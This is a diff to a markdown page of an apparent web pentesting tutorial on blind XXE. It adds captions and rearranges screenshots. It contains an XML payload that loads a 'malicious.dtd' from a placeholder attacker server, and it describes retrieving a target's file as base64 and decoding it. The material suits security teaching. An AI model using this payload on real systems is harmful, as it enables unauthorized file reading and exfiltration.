@@ -50,16 +50,18 @@ Sometimes the server doesn't show the file we want to output. We can try to make
 ```
 
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3" width="600">
-
+- This time the Wrapper we are using is:
 ```xml
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "<AttackerServer>/malicious.dtd"> %xxe;]>
 ```
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3" width="600">
 
-![3](https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/938762fb-89a8-4b18-94ba-8ecc5f2e57c3)
+- Getting the base64 file from the target and decoding it.
+
+<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/01b1ee23-a7a5-4cd0-addf-f626f9e1a75b" width="700">
 
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/d08deeba-67c9-49e3-bdd4-a29dde33e9be" width="600">
 
-<img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/01b1ee23-a7a5-4cd0-addf-f626f9e1a75b" width="700">
 
 
 
